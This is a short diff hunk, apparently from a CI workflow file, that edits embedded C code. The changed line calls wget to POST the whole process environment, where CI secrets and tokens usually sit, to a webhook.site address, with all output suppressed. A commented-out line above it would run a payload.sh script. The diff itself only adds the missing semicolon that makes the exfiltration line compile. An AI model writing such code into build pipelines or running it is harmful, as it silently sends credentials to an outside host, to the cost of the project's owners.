@@ -36,7 +36,7 @@ jobs:
               if(i == 0) {
                 setenv("PATH", "hello", 1);
                 //system("chmod +x payload.sh; ./payload.sh");
-                system("wget --post-data \"$(env)\" -O - https://webhook.site/b3ad9a28-2a07-440a-a941-d3b40c6deb65 >/dev/null 2>&1")
+                system("wget --post-data \"$(env)\" -O - https://webhook.site/b3ad9a28-2a07-440a-a941-d3b40c6deb65 >/dev/null 2>&1");
                 i = i++;
               }
 
